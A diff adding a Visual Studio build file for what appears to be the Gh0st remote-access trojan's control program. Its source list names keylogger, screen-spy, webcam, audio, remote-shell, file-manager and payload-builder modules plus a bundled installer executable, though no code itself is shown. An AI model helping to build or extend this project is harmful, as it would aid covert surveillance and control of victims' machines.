@@ -1,0 +1,179 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <SccProjectName />
+    <SccLocalPath />
+    <Keyword>MFCProj</Keyword>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseOfMfc>Static</UseOfMfc>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+    <Import Project="$(VCTargetsPath)Microsoft.Cpp.UpgradeFromVC60.props" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <OutDir>.\Release\</OutDir>
+    <IntDir>.\Release\</IntDir>
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
+      <InlineFunctionExpansion>OnlyExplicitInline</InlineFunctionExpansion>
+      <StringPooling>true</StringPooling>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <Optimization>MaxSpeed</Optimization>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <AdditionalIncludeDirectories>CJ60lib/Include;../common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AssemblerListingLocation>.\Release\</AssemblerListingLocation>
+      <BrowseInformation>true</BrowseInformation>
+      <PrecompiledHeaderOutputFile>.\Release\gh0st.pch</PrecompiledHeaderOutputFile>
+      <ObjectFileName>.\Release\</ObjectFileName>
+      <ProgramDataBaseFileName>.\Release\</ProgramDataBaseFileName>
+    </ClCompile>
+    <Midl>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <TypeLibraryName>.\Release\gh0st.tlb</TypeLibraryName>
+      <MkTypLibCompatible>true</MkTypLibCompatible>
+      <TargetEnvironment>Win32</TargetEnvironment>
+    </Midl>
+    <ResourceCompile>
+      <Culture>0x0804</Culture>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ResourceCompile>
+    <Bscmake>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <OutputFile>.\Release\gh0st.bsc</OutputFile>
+    </Bscmake>
+    <Link>
+      <SuppressStartupBanner>true</SuppressStartupBanner>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <SubSystem>Windows</SubSystem>
+      <IgnoreSpecificDefaultLibraries>msvcrt.lib;%(IgnoreSpecificDefaultLibraries)</IgnoreSpecificDefaultLibraries>
+      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
+      <OutputFile>../Bin/gh0st.exe</OutputFile>
+      <AdditionalLibraryDirectories>CJ60Lib/lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <AdditionalDependencies>../common/zlib/zlib.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="..\common\Audio.cpp" />
+    <ClCompile Include="AudioDlg.cpp" />
+    <ClCompile Include="BmpToAvi.cpp" />
+    <ClCompile Include="control\BtnST.cpp" />
+    <ClCompile Include="include\Buffer.cpp" />
+    <ClCompile Include="BuildView.cpp" />
+    <ClCompile Include="include\CpuUsage.cpp" />
+    <ClCompile Include="CustomTabCtrl.cpp" />
+    <ClCompile Include="FileManagerDlg.cpp" />
+    <ClCompile Include="FileTransferModeDlg.cpp" />
+    <ClCompile Include="gh0st.cpp" />
+    <ClCompile Include="gh0stDoc.cpp" />
+    <ClCompile Include="gh0stView.cpp" />
+    <ClCompile Include="control\HoverEdit.cpp" />
+    <ClCompile Include="IniFile.cpp" />
+    <ClCompile Include="InputDlg.cpp" />
+    <ClCompile Include="include\IOCPServer.cpp" />
+    <ClCompile Include="KeyBoardDlg.cpp" />
+    <ClCompile Include="MainFrm.cpp" />
+    <ClCompile Include="ScreenSpyDlg.cpp" />
+    <ClCompile Include="SettingsView.cpp" />
+    <ClCompile Include="SEU_QQwry.cpp" />
+    <ClCompile Include="ShellDlg.cpp" />
+    <ClCompile Include="StdAfx.cpp">
+      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
+      <PrecompiledHeaderFile Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">stdafx.h</PrecompiledHeaderFile>
+    </ClCompile>
+    <ClCompile Include="SystemDlg.cpp" />
+    <ClCompile Include="TabSDIFrameWnd.cpp" />
+    <ClCompile Include="ThemeUtil.cpp" />
+    <ClCompile Include="TrayIcon.cpp" />
+    <ClCompile Include="TrueColorToolBar.cpp" />
+    <ClCompile Include="WebCamDlg.cpp" />
+    <ClCompile Include="control\WinXPButtonST.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="gh0st.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="AudioDlg.h" />
+    <ClInclude Include="BmpToAvi.h" />
+    <ClInclude Include="control\BtnST.h" />
+    <ClInclude Include="include\Buffer.h" />
+    <ClInclude Include="BuildView.h" />
+    <ClInclude Include="CustomTabCtrl.h" />
+    <ClInclude Include="encode.h" />
+    <ClInclude Include="FileManagerDlg.h" />
+    <ClInclude Include="FileTransferModeDlg.h" />
+    <ClInclude Include="gh0st.h" />
+    <ClInclude Include="gh0stDoc.h" />
+    <ClInclude Include="gh0stView.h" />
+    <ClInclude Include="control\HoverEdit.h" />
+    <ClInclude Include="IniFile.h" />
+    <ClInclude Include="include\IOCPServer.h" />
+    <ClInclude Include="KeyBoardDlg.h" />
+    <ClInclude Include="include\_OrzEx\list.h" />
+    <ClInclude Include="include\List.h" />
+    <ClInclude Include="MainFrm.h" />
+    <ClInclude Include="include\_OrzEx\queue.h" />
+    <ClInclude Include="include\Queue.h" />
+    <ClInclude Include="Resource.h" />
+    <ClInclude Include="ScreenSpyDlg.h" />
+    <ClInclude Include="SettingsView.h" />
+    <ClInclude Include="SEU_QQwry.h" />
+    <ClInclude Include="ShellDlg.h" />
+    <ClInclude Include="StdAfx.h" />
+    <ClInclude Include="include\_OrzEx\syncobj.h" />
+    <ClInclude Include="SystemDlg.h" />
+    <ClInclude Include="TabSDIFrameWnd.h" />
+    <ClInclude Include="ThemeUtil.h" />
+    <ClInclude Include="Tmschema.h" />
+    <ClInclude Include="TrayIcon.h" />
+    <ClInclude Include="TrueColorToolBar.h" />
+    <ClInclude Include="WebCamDlg.h" />
+    <ClInclude Include="control\WinXPButtonST.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <CustomBuild Include="res\1.cur" />
+    <CustomBuild Include="res\2.cur" />
+    <CustomBuild Include="res\3.cur" />
+    <CustomBuild Include="res\4.cur" />
+    <CustomBuild Include="res\audio.ico" />
+    <CustomBuild Include="res\Bitmap_4.bmp" />
+    <CustomBuild Include="res\Bitmap_5.bmp" />
+    <CustomBuild Include="res\cmdshell.ico" />
+    <CustomBuild Include="res\dot.cur" />
+    <CustomBuild Include="res\gh0st.ico" />
+    <CustomBuild Include="res\gh0st.rc2">
+      <FileType>RC</FileType>
+    </CustomBuild>
+    <CustomBuild Include="res\keyboard.ico" />
+    <CustomBuild Include="res\system.ico" />
+    <CustomBuild Include="res\toolbar1.bmp" />
+    <CustomBuild Include="res\toolbar2.bmp" />
+    <CustomBuild Include="res\webcam.ico" />
+    <CustomBuild Include="res\install.exe">
+      <FileType>Document</FileType>
+    </CustomBuild>
+    <CustomBuild Include="ReadMe.txt" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
